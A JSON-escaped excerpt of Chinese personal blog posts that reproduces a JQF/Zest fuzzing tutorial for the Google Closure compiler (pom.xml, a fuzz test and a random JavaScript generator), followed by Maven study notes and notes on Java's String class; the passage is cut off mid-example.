xsi:schemaLocation=\u0026quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026quot;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;examples\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;zest-tutorial\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;1.8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;1.8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- Google Closure: 被检测的文件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.google.javascript\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;closure-compiler\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;v20180204\u0026lt;/version\u0026gt; \u0026lt;!-- 使用阶段：test：仅参与测试相关的内容，包括测试的编译和执行 --\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- JQF: @Fuzz标签要用到的依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;edu.berkeley.cs.jqf\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jqf-fuzz\u0026lt;/artifactId\u0026gt; \u0026lt;!-- 确保安装最新版 https://mvnrepository.com/artifact/edu.berkeley.cs.jqf --\u0026gt; \u0026lt;version\u0026gt;1.1\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- JUnit-QuickCheck: 编写生成器要用到的API --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.pholser\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit-quickcheck-generators\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.8\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;!-- 安装mvn调用jqf-zest的插件 --\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;edu.berkeley.cs.jqf\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jqf-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;!-- 确保安装最新版 https://mvnrepository.com/artifact/edu.berkeley.cs.jqf --\u0026gt; \u0026lt;version\u0026gt;1.1\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt;  Test代码 内容保存到src/test/java/examples/CompilerTest.java，即maven的资源文件下，用于test的、java语言的、examples包。\npackage examples; import java.io.ByteArrayOutputStream; import java.io.PrintStream; // 以下这些应该时被测试的内容，需要调用这些内容然后检查是否正确 import com.google.javascript.jscomp.CompilationLevel; import com.google.javascript.jscomp.Compiler; import com.google.javascript.jscomp.CompilerOptions; import com.google.javascript.jscomp.Result; import com.google.javascript.jscomp.SourceFile; // 以下这些应该是和@出的标签配套的内容（猜测） import com.pholser.junit.quickcheck.From; import edu.berkeley.cs.jqf.fuzz.Fuzz; import edu.berkeley.cs.jqf.fuzz.JQF; import org.junit.Before; import org.junit.runner.RunWith; import static org.junit.Assume.*; @RunWith(JQF.class) public class CompilerTest { static { // 禁用所有因为Closure运行导致的日志读写操作，这样可以加快测试速度 java.util.logging.LogManager.getLogManager().reset(); } // 用到的的编译器 private Compiler compiler = new Compiler(new PrintStream(new ByteArrayOutputStream(), false)); // 可供修改的默认编译选项 private CompilerOptions options = new CompilerOptions(); // 这个是啥？？？ private SourceFile externs = SourceFile.fromCode(\u0026quot;externs\u0026quot;, \u0026quot;\u0026quot;); @Before // 以下方法为在测试开始前运行一次的内容 public void initCompiler() { // 禁用多线程以及过程信息打印 compiler.disableThreads(); options.setPrintConfig(false); // 开启所有的安全优化（为啥？？？） CompilationLevel.SIMPLE_OPTIMIZATIONS.setOptionsForCompilationLevel(options); } // 进行编译并返回编译结果（期待在这个过程中发现未知的错误） private Result compile(SourceFile input) { Result result = compiler.compile(externs, input, options); assumeTrue(result.success); // 这里看不懂了，为啥要有这个assume？？？ return result; } // 调用已有的默认的Generator，生成随机的字符串来进行测试（未结构化） @Fuzz public void testWithString(String code) { SourceFile input = SourceFile.fromCode(\u0026quot;input\u0026quot;, code); // 下句并未使用断言，想获取在编译过程中出乎意料的报错，而非我们可以预想到的问题 compile(input); } }  生成器代码 package examples; import java.util.*; import java.util.function.*; import com.pholser.junit.quickcheck.generator.GenerationStatus; import com.pholser.junit.quickcheck.generator.Generator; import com.pholser.junit.quickcheck.random.SourceOfRandomness; /* Generates random strings that are syntactically valid JavaScript */ public class JavaScriptCodeGenerator extends Generator\u0026lt;String\u0026gt; { public JavaScriptCodeGenerator() { super(String.class); // Register type of generated object } private GenerationStatus status; // saved state object when generating private static final int MAX_IDENTIFIERS = 100; private static final int MAX_EXPRESSION_DEPTH = 10; private static final int MAX_STATEMENT_DEPTH = 6; private static Set\u0026lt;String\u0026gt; identifiers; // Stores generated IDs, to promote re-use private int statementDepth; // Keeps track of how deep the AST is at any point private int expressionDepth; // Keeps track of how nested an expression is at any point private static final String[] UNARY_TOKENS = { \u0026quot;!\u0026quot;, \u0026quot;++\u0026quot;, \u0026quot;--\u0026quot;, \u0026quot;~\u0026quot;, \u0026quot;delete\u0026quot;, \u0026quot;new\u0026quot;, \u0026quot;typeof\u0026quot; }; private static final String[] BINARY_TOKENS = { \u0026quot;!=\u0026quot;, \u0026quot;!==\u0026quot;, \u0026quot;%\u0026quot;, \u0026quot;%=\u0026quot;, \u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;=\u0026quot;, \u0026quot;*\u0026quot;, \u0026quot;*=\u0026quot;, \u0026quot;+\u0026quot;, \u0026quot;+=\u0026quot;, \u0026quot;,\u0026quot;, \u0026quot;-\u0026quot;, \u0026quot;-=\u0026quot;, \u0026quot;/\u0026quot;, \u0026quot;/=\u0026quot;, \u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026lt;\u0026lt;\u0026quot;, \u0026quot;\u0026gt;\u0026gt;=\u0026quot;, \u0026quot;\u0026lt;=\u0026quot;, \u0026quot;=\u0026quot;, \u0026quot;==\u0026quot;, \u0026quot;===\u0026quot;, \u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026gt;=\u0026quot;, \u0026quot;\u0026gt;\u0026gt;\u0026quot;, \u0026quot;\u0026gt;\u0026gt;=\u0026quot;, \u0026quot;\u0026gt;\u0026gt;\u0026gt;\u0026quot;, \u0026quot;\u0026gt;\u0026gt;\u0026gt;=\u0026quot;, \u0026quot;^\u0026quot;, \u0026quot;^=\u0026quot;, \u0026quot;|\u0026quot;, \u0026quot;|=\u0026quot;, \u0026quot;||\u0026quot;, \u0026quot;in\u0026quot;, \u0026quot;instanceof\u0026quot; }; /** Main entry point. Called once per test case. Returns a random JS program. */ @Override public String generate(SourceOfRandomness random, GenerationStatus status) { this.status = status; // we save this so that we can pass it on to other generators this.identifiers = new HashSet\u0026lt;\u0026gt;(); this.statementDepth = 0; this.expressionDepth = 0; return generateStatement(random).toString(); } /** Utility method for generating a random list of items (e.g. statements, arguments, attributes) */ private static List\u0026lt;String\u0026gt; generateItems(Function\u0026lt;SourceOfRandomness, String\u0026gt; genMethod, SourceOfRandomness random, int mean) { int len = random.nextInt(mean*2); // Generate random number in [0, mean*2) List\u0026lt;String\u0026gt; items = new ArrayList\u0026lt;\u0026gt;(len); for (int i = 0; i \u0026lt; len; i++) { items.add(genMethod.apply(random)); } return items; } /** Generates a random JavaScript statement */ private String generateStatement(SourceOfRandomness random) { statementDepth++; String result; // If depth is too high, then generate only simple statements to prevent infinite recursion // If not, generate simple statements after the flip of a coin if (statementDepth \u0026gt;= MAX_STATEMENT_DEPTH || random.nextBoolean()) { // Choose a random private method from this class, and then call it with `random` result = random.choose(Arrays.\u0026lt;Function\u0026lt;SourceOfRandomness, String\u0026gt;\u0026gt;asList( this::generateExpressionStatement, this::generateBreakNode, this::generateContinueNode, this::generateReturnNode, this::generateThrowNode, this::generateVarNode, this::generateEmptyNode )).apply(random); } else { // If depth is low and we won the flip, then generate compound statements // (that is, statements that contain other statements) result = random.choose(Arrays.\u0026lt;Function\u0026lt;SourceOfRandomness, String\u0026gt;\u0026gt;asList( this::generateIfNode, this::generateForNode, this::generateWhileNode, this::generateNamedFunctionNode, this::generateSwitchNode, this::generateTryNode, this::generateBlock )).apply(random); } statementDepth--; // Reset statement depth when going up the recursive tree return result; } /** Generates a random JavaScript expression using recursive calls */ private String generateExpression(SourceOfRandomness random) { expressionDepth++; String result; // Choose terminal if nesting depth is too high or based on a random flip of a coin if (expressionDepth \u0026gt;= MAX_EXPRESSION_DEPTH || random.nextBoolean()) { result = random.choose(Arrays.\u0026lt;Function\u0026lt;SourceOfRandomness, String\u0026gt;\u0026gt;asList( this::generateLiteralNode, this::generateIdentNode )).apply(random); } else { // Otherwise, choose a non-terminal generating function result = random.choose(Arrays.\u0026lt;Function\u0026lt;SourceOfRandomness, String\u0026gt;\u0026gt;asList( this::generateBinaryNode, this::generateUnaryNode, this::generateTernaryNode, this::generateCallNode, this::generateFunctionNode, this::generatePropertyNode, this::generateIndexNode, this::generateArrowFunctionNode )).apply(random); } expressionDepth--; return \u0026quot;(\u0026quot; + result + \u0026quot;)\u0026quot;; } /** Generates a random binary expression (e.g. A op B) */ private String generateBinaryNode(SourceOfRandomness random) { String token = random.choose(BINARY_TOKENS); // Choose a binary operator at random String lhs = generateExpression(random); String rhs = generateExpression(random); return lhs + \u0026quot; \u0026quot; + token + \u0026quot; \u0026quot; + rhs; } /** Generates a block of statements delimited by ';' and enclosed by '{' '}' */ private String generateBlock(SourceOfRandomness random) { return \u0026quot;{ \u0026quot; + String.join(\u0026quot;;\u0026quot;, generateItems(this::generateStatement, random, 4)) + \u0026quot; }\u0026quot;; } private String generateBreakNode(SourceOfRandomness random) { return \u0026quot;break\u0026quot;; } private String generateCallNode(SourceOfRandomness random) { String func = generateExpression(random); String args = String.join(\u0026quot;,\u0026quot;, generateItems(this::generateExpression, random, 3)); String call = func + \u0026quot;(\u0026quot; + args + \u0026quot;)\u0026quot;; if (random.nextBoolean()) { return call; } else { return \u0026quot;new \u0026quot; + call; } } private String generateCaseNode(SourceOfRandomness random) { return \u0026quot;case \u0026quot; + generateExpression(random) + \u0026quot;: \u0026quot; + generateBlock(random); } private String generateCatchNode(SourceOfRandomness random) { return \u0026quot;catch (\u0026quot; + generateIdentNode(random) + \u0026quot;) \u0026quot; + generateBlock(random); } private String generateContinueNode(SourceOfRandomness random) { return \u0026quot;continue\u0026quot;; } private String generateEmptyNode(SourceOfRandomness random) { return \u0026quot;\u0026quot;; } private String generateExpressionStatement(SourceOfRandomness random) { return generateExpression(random); } private String generateForNode(SourceOfRandomness random) { String s = \u0026quot;for(\u0026quot;; if (random.nextBoolean()) { s += generateExpression(random); } s += \u0026quot;;\u0026quot;; if (random.nextBoolean()) { s += generateExpression(random); } s += \u0026quot;;\u0026quot;; if (random.nextBoolean()) { s += generateExpression(random); } s += \u0026quot;)\u0026quot;; s += generateBlock(random); return s; } private String generateFunctionNode(SourceOfRandomness random) { return \u0026quot;function(\u0026quot; + String.join(\u0026quot;, \u0026quot;, generateItems(this::generateIdentNode, random, 5)) + \u0026quot;)\u0026quot; + generateBlock(random); } private String generateNamedFunctionNode(SourceOfRandomness random) { return \u0026quot;function \u0026quot; + generateIdentNode(random) + \u0026quot;(\u0026quot; + String.join(\u0026quot;, \u0026quot;, generateItems(this::generateIdentNode, random, 5)) + \u0026quot;)\u0026quot; + generateBlock(random); } private String generateArrowFunctionNode(SourceOfRandomness random) { String params = \u0026quot;(\u0026quot; + String.join(\u0026quot;, \u0026quot;, generateItems(this::generateIdentNode, random, 3)) + \u0026quot;)\u0026quot;; if (random.nextBoolean()) { return params + \u0026quot; =\u0026gt; \u0026quot; + generateBlock(random); } else { return params + \u0026quot; =\u0026gt; \u0026quot; + generateExpression(random); } } private String generateIdentNode(SourceOfRandomness random) { // Either generate a new identifier or use an existing one String identifier; if (identifiers.isEmpty() || (identifiers.size() \u0026lt; MAX_IDENTIFIERS \u0026amp;\u0026amp; random.nextBoolean())) { identifier = random.nextChar('a', 'z') + \u0026quot;_\u0026quot; + identifiers.size(); identifiers.add(identifier); } else { identifier = random.choose(identifiers); } return identifier; } private String generateIfNode(SourceOfRandomness random) { return \u0026quot;if (\u0026quot; + generateExpression(random) + \u0026quot;) \u0026quot; + generateBlock(random) + (random.nextBoolean() ? generateBlock(random) : \u0026quot;\u0026quot;); } private String generateIndexNode(SourceOfRandomness random) { return generateExpression(random) + \u0026quot;[\u0026quot; + generateExpression(random) + \u0026quot;]\u0026quot;; } private String generateObjectProperty(SourceOfRandomness random) { return generateIdentNode(random) + \u0026quot;: \u0026quot; + generateExpression(random); } private String generateLiteralNode(SourceOfRandomness random) { // If we are not too deeply nested, then it is okay to generate array/object literals if (expressionDepth \u0026lt; MAX_EXPRESSION_DEPTH \u0026amp;\u0026amp; random.nextBoolean()) { if (random.nextBoolean()) { // Array literal return \u0026quot;[\u0026quot; + String.join(\u0026quot;, \u0026quot;, generateItems(this::generateExpression, random, 3)) + \u0026quot;]\u0026quot;; } else { // Object literal return \u0026quot;{\u0026quot; + String.join(\u0026quot;, \u0026quot;, generateItems(this::generateObjectProperty, random, 3)) + \u0026quot;}\u0026quot;; } } else { // Otherwise, generate primitive literals return random.choose(Arrays.\u0026lt;Supplier\u0026lt;String\u0026gt;\u0026gt;asList( () -\u0026gt; String.valueOf(random.nextInt(-10, 1000)), // int literal () -\u0026gt; String.valueOf(random.nextBoolean()), // bool literal () -\u0026gt; generateStringLiteral(random), () -\u0026gt; \u0026quot;undefined\u0026quot;, () -\u0026gt; \u0026quot;null\u0026quot;, () -\u0026gt; \u0026quot;this\u0026quot; )).get(); } } private String generateStringLiteral(SourceOfRandomness random) { // Generate an arbitrary string using the default string generator, and quote it return '\u0026quot;' + gen().type(String.class).generate(random, status) + '\u0026quot;'; } private String generatePropertyNode(SourceOfRandomness random) { return generateExpression(random) + \u0026quot;.\u0026quot; + generateIdentNode(random); } private String generateReturnNode(SourceOfRandomness random) { return random.nextBoolean() ? \u0026quot;return\u0026quot; : \u0026quot;return \u0026quot; + generateExpression(random); } private String generateSwitchNode(SourceOfRandomness random) { return \u0026quot;switch(\u0026quot; + generateExpression(random) + \u0026quot;) {\u0026quot; + String.join(\u0026quot; \u0026quot;, generateItems(this::generateCaseNode, random, 2)) + \u0026quot;}\u0026quot;; } private String generateTernaryNode(SourceOfRandomness random) { return generateExpression(random) + \u0026quot; ? \u0026quot; + generateExpression(random) + \u0026quot; : \u0026quot; + generateExpression(random); } private String generateThrowNode(SourceOfRandomness random) { return \u0026quot;throw \u0026quot; + generateExpression(random); } private String generateTryNode(SourceOfRandomness random) { return \u0026quot;try \u0026quot; + generateBlock(random) + generateCatchNode(random); } private String generateUnaryNode(SourceOfRandomness random) { String token = random.choose(UNARY_TOKENS); return token + \u0026quot; \u0026quot; + generateExpression(random); } private String generateVarNode(SourceOfRandomness random) { return \u0026quot;var \u0026quot; + generateIdentNode(random); } private String generateWhileNode(SourceOfRandomness random) { return \u0026quot;while (\u0026quot; + generateExpression(random) + \u0026quot;)\u0026quot; + generateBlock(random); } }  在使用IDEA阅读代码过程中遇到的问题 can\u0026rsquo;t find the declaration to go to 问题背景 在使用IDEA过程中，需要通过Ctrl + click的操作去方便阅读代码的上下文，更快确定父类、库之类的东西。但是在直接导入JQF的过程中发现无法找到，总是返回如题的报错。\n解决过程 上网搜索发现是IDEA的配置中没有配置好本地已有的maven插件，IDEA中的maven插件与本地的maven插件发生了冲突，在File - New Project Settings 中修改Build - Build Tools - Maven中修改就行，然后清除掉之前已有的问题文件，重新建立依赖关系，就能准确定位了。\n在此过程中，需要注意IDEA的Open和Import是不同的功能，在从外部导入的文件（git下载的，svn下载的，直接拷贝的）建议直接使用Import，而已经在本地Import过的文件如果需要再次打开，则使用Open。\n","id":14,"section":"posts","summary":"\u003cp\u003e虽然论文已经写得挺明白的了（老师学长如是说道），但是本垃圾还是看得五步一百度，十步一谷歌\u0026hellip;\u003c/p\u003e\n\u003cp\u003e菜死了，理解速度还跟不上，有时候一段文字需要查好几个小时才看明白\u0026hellip;\u003c/p\u003e","tags":["Fuzzing","Zest"],"title":"论文给出例子实现中遇到问题","uri":"https://qeryu.github.io/2020/03/%E8%AE%BA%E6%96%87%E7%BB%99%E5%87%BA%E4%BE%8B%E5%AD%90%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98/","year":"2020"},{"content":"在JQF的安装过程中，频繁使用了mvn相关的命令，这里留存一些maven的相关笔记，源于廖雪峰Java教程，方便查阅\n使用背景 为了保证一个项目A的运行，需要在运行时导入他所需要的所有依赖，假设他依赖于B，那么就有两种解决办法\n 将B项目打包成jar包，导入到A中，每次下载A，同时也会下载A中包含的B 给A增添使用文档，如果要使用A，就必须由使用者自己再去下载B  第一种方法会造成A包特大，而且如果之前已经有B包在电脑中，这样会重复下载，造成不必要的空间浪费。第二种会增加使用者的工作量，繁琐。在此背景下，出现了Apache Maven，其核心功能是合理叙述项目间的依赖关系，通俗点讲，就是通过pom.xml文件的配置获取jar包。\n项目内容 Maven使用pom.xml定义项目内容，有其固定的目录结构，这个结构是自动生成的，不需要自己手动编辑。Maven使用三个变量定位唯一一个依赖，groupId, artifactId, version。声明了一个依赖，Maven就会自动下载这个依赖，并把这个依赖导入Windows的环境变量classpath，之前有博客，写过这个classpath是可以通过IDE设置的.\n依赖管理 如果我们的项目依赖 B包，B包的运行又依赖于 C包。在声明的时候，只需要声明依赖B包，C包的依赖会由maven检测，然后自动配置。下面的例子，这个被声明的包，实际上要依赖二三十个包\u0026hellip;\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.2.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;  依赖关系 Maven中定义了四种依赖关系\n   scope 说明 示例     compile 编译时需要用到该jar包（默认） commons-logging   test 编译Test时需要用到该jar包 junit   runtime 编译时不需要，但运行时需要用到 mysql   provided 编译时需要用到，但运行时由JDK或某个服务器提供 servlet-api    其中compile依赖关系，是默认的，其他依赖关系的声明需要用\u0026lt;scope\u0026gt;标签，演示如下：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.48\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt;  国内镜像 又到了从国外服务器(repo1.maven.org)下载的时候了\u0026hellip;被docker支配的恐惧又出现了\u0026hellip;感谢阿里爸爸的国内镜像仓库救我小命。\nWindows环境下 在用户主目录下，进入.m2目录，创建一个settings.xml配置文件内容如下：\n\u0026lt;settings\u0026gt; \u0026lt;mirrors\u0026gt; \u0026lt;mirror\u0026gt; \u0026lt;id\u0026gt;aliyun\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun\u0026lt;/name\u0026gt; \u0026lt;mirrorOf\u0026gt;central\u0026lt;/mirrorOf\u0026gt; \u0026lt;!-- 国内推荐阿里云的Maven镜像 --\u0026gt; \u0026lt;url\u0026gt;http://maven.aliyun.com/nexus/content/groups/public/\u0026lt;/url\u0026gt; \u0026lt;/mirror\u0026gt; \u0026lt;/mirrors\u0026gt; \u0026lt;/settings\u0026gt;  Linux环境下 运行下面的命令，这会在用户目录下生成一个./m2目录，刚刚安装完的Maven是没有这个目录的。\n在这个隐藏目录之下，新建文件settings.xml，之后流程同上。\n第三方插件 如果我们要引用一个第三方组件，比如okhttp，如何确切地获得它的groupId、artifactId和version？\n方法是通过search.maven.org搜索关键字，找到对应的组件后，直接复制\n构建流程 lifeCycle Maven的生命周期由一系列阶段（phase）构成\n内置生命周期 default 包含以下phase\n validate initialize generate-sources process-sources generate-resources process-resources compile process-classes generate-test-sources process-test-sources generate-test-resources process-test-resources test-compile process-test-classes test prepare-package package pre-integration-test integration-test post-integration-test verify install deploy  mvn pakage # 执行default生命周期，运行至package为止 mvn compile # 执行default生命周期，运行至compile为止  clean 包含以下phase\n pre-clean clean （注意这个clean不是lifecycle而是phase） post-clean  Phase 常用开发命令    命令 解释     mvn clean 清理所有生成的class和jar   mvn clean compile 先清理，再执行到compile   mvn clean test 先清理，再执行到test，因为执行test前必须执行compile，所以这里不必指定compile   mvn clean package 先清理，再执行到package    常用phase  clean：清理 compile：编译 test：运行测试 package：打包  Goal 执行一个phase又会触发一个或多个goal：\n   执行的Phase 对应执行的Goal     compile compiler:compile   test compiler:testCompile surefile:test    goal的命名总是abc:xyz这种形式。\n可以类比：\n lifecycle相当于Java的package，它包含一个或多个phase； phase相当于Java的class，它包含一个或多个goal； goal相当于class的method，它其实才是真正干活的。  使用插件 实际上，执行每个phase，都是通过某个插件（plugin）来执行的，Maven本身其实并不知道如何执行compile，它只是负责找到对应的compiler插件，然后执行默认的compiler:compile这个goal来完成编译。\n所以，使用Maven，实际上就是配置好需要使用的插件，然后通过phase调用它们。下面是常用标准插件。\n   插件名称 对应执行的phase     clean clean   compiler compile   surefire test   jar package    也可以自定义插件，如果要使用还需要在pom.xml中声明，具体内容应该暂时用不到，用到的时候上网再找吧。关于插件使用与自定义，有Maven的官方文档可供查阅。\n模块管理 Maven可以对工程中的模块进行管理，对各个模块中的pom.xml文件中的相同的部分，可以提取出来作为parent的pom.xml文件，放在与各个模块并列的parent文件夹下，使用的时候需要定义\n\u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;com.itranswarp.learnjava\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;relativePath\u0026gt;../parent/pom.xml\u0026lt;/relativePath\u0026gt; \u0026lt;/parent\u0026gt;  而模块之间的依赖关系也可以通过pom.xml文件进行声明\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.itranswarp.learnjava\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;module-b\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt;  在根目录下需要由一个pom.xml文件进行统一编译，对于各个包含的模块需要声明包含，还需要声明自己的身份。\n\u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.itranswarp.learnjava\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;build\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt;build\u0026lt;/name\u0026gt; \u0026lt;modules\u0026gt; \u0026lt;module\u0026gt;parent\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;module-a\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;module-b\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;module-c\u0026lt;/module\u0026gt; \u0026lt;/modules\u0026gt;  使用mvnw 全称为Maven Wrapper，提供独立的、指定版本的Maven使用。\nmvn -N io.takari:maven:0.7.6:wrapper -Dmaven=3.3.3  这个命令安装了0.7.6版本的Maven Wrapper，并安装了3.3.3版本的Maven，安装过后，按照使用mvn命令的语法使用mvnw命令就可以使用与项目关联的Maven。\n在Linux或macOS下运行时需要加上./：\n./mvnw clean package  其他 Xftp 显示主机中的隐藏文件与隐藏文件夹 工具 - 选项 - 常规 - 勾选“显示隐藏的文件”\n","id":15,"section":"posts","summary":"\u003cp\u003e在JQF的安装过程中，频繁使用了\u003ccode\u003emvn\u003c/code\u003e相关的命令，这里留存一些maven的相关笔记，源于廖雪峰Java教程，方便查阅\u003c/p\u003e","tags":["Java","Maven"],"title":"Java学习笔记——Maven","uri":"https://qeryu.github.io/2020/03/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0maven/","year":"2020"},{"content":"上一篇记录了Java的面向对象的语法，这篇来一点常用的核心类。\nString类 感觉一个一个描述蛮蠢的，直接上表吧，方便快查\n   方法原型 方法描述     static String copyValueOf(char[] data) 返回指定数组中表示该字符序列的 String   static String copyValueOf(char[] data, int offset, int count) 返回指定数组中表示该字符序列的 String   void getChars(int srcBegin, int srcEnd, char[] dst, int dstBegin)  将字符从此字符串复制到目标字符数组。   String intern()  返回字符串对象的规范化表示形式    字符串比较    子串比较方法 方法解释     int compareTo(Object o) 把这个字符串和另一个对象比较   int compareTo(String other) 按字典顺序比较两个字符串   int compareToIgnoreCase(String str) 按字典顺序比较两个字符串，不考虑大小写   boolean equals(Object anObject)  将此字符串与指定的对象比较。   boolean equalsIgnoreCase(String other)  将此 String 与另一个 String 比较，不考虑大小写。   boolean contentEquals(StringBuffer sb) 字符串与指定的StringBuffer有相同顺序的字符时候返回真    除了这些整体比较以及上文的正则表达式匹配之外，还有直接比较两个字符串子串的方法\nboolean regionMatches(boolean ignoreCase, int toffset, String other, int ooffset, int len) /* 测试两个字符串区域是否相等 ignoreCase: 是否忽略大小写 toffset: 使用方法的字符串中，待比较子串起始位置的偏移量 other: 与之比较的另一个字符串 ooffset: other字符串中，待比较子串起始位置的偏移量 len: 比较的子串的长度 */ boolean regionMatches(int toffset, String other, int ooffset, int len) // 同上，少了一个参数  StringBuffer与StringBuilder 和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。一般在代码中出现，多次使用 + 拼接字符串的时候，编译器会选择在StringBuilder中进行拼接，以节约空间。\nStringBuilder 的方法不是线程安全的（不能同步访问）。由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。两者接口相同。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。\n以上两者都支持链式操作，原因是支持链式操作的方法都是返回了this\u0026hellip;\n感觉这个和之前写qqbot的时候，coolq提供的API的方法很像呢，有点golang基础看这个舒服多了。\npublic class Main { public static void main(String[] args) { var sb = new StringBuilder(1024); sb.append(\u0026quot;Mr \u0026quot;) .append(\u0026quot;Bob\u0026quot;) .append(\u0026quot;!\u0026quot;) .insert(0, \u0026quot;Hello, \u0026quot;); System.out.println(sb.toString()); } }  ‘==’与equals()的区别 使用“==”比较字符串，实际上是比较的字符串在内存中的地址。要比较内容只能是使用equals()方法。\nString s1 = \u0026quot;abc\u0026quot;; String s2 = \u0026quot;abc\u0026quot;; s1 == s2 // true // 这是因为Java编译器在编译期，会自动把所有相同的字符串当作一个对象放入常量池，自然s1和s2的引用就是相同的  拼接字符串    拼接方法 方法解释     String concat(String str)  将指定字符串连接到此字符串的结尾   String join(String link, String[] arr) 用给定的link字符串连接字符串数组    在使用join方法的时候，内部实现是通过了一个StringJoin类，这个类是通过StringBuffer实现的。在使用时，可以比join多出一些功能，比如指定拼接后的传的开头与结尾。开头与拼接串，拼接串与结尾，直接连接，不加link，示例如下。\nimport java.util.StringJoiner; public class Main { public static void main(String[] args) { String[] names = {\u0026quot;Bob\u0026quot;, \u0026quot;Alice\u0026quot;, \u0026quot;Grace\u0026quot;}; var sj = new StringJoiner(\u0026quot;, \u0026quot;, \u0026quot;Hello \u0026quot;, \u0026quot;!\u0026quot;); for (String name : names) { sj.add(name); } System.out.println(sj.toString()); } } // Hello Bob, Alice, Grace!  类型转化 一般类型转换 // 返回给定data type类型x参数的字符串表示形式 static String valueOf(primitive data type x) String.valueOf(45.67); // \u0026quot;45.67\u0026quot; // 字符串转换为int类型 int n1 = Integer.parseInt(\u0026quot;123\u0026quot;); // 123 int n2 = Integer.parseInt(\u0026quot;ff\u0026quot;, 16); // 按十六进制转换，255 // 把字符串转换为boolean类型 boolean b1 = Boolean.parseBoolean(\u0026quot;true\u0026quot;); // true boolean b2 = Boolean.parseBoolean(\u0026quot;FALSE\u0026quot;); // false  要特别注意，Integer有个getInteger(String)方法，它不是将字符串转换为int，而是把该字符串对应的系统变量转换为Integer\nInteger.getInteger(\u0026quot;java.version\u0026quot;); // 版本号，11  char[]与String类型转换 char[] cs = \u0026quot;Hello\u0026quot;.toCharArray(); // String -\u0026gt; char[] String s = new String(cs); // char[] -\u0026gt; String  通过char[]转出时String，是复制了一份char[]数组，修改外部char[]不会影响String中的char[]。\n提取子串    提取子串方法 方法解释     String substring(int beginIndex)  返回一个新的字符串，它是此字符串的一个子字符串   String substring(int beginIndex, int endIndex)  返回一个新字符串，它是此字符串的一个子字符串    编码 手动转变编码\nbyte[] b1 = \u0026quot;Hello\u0026quot;.getBytes(); // 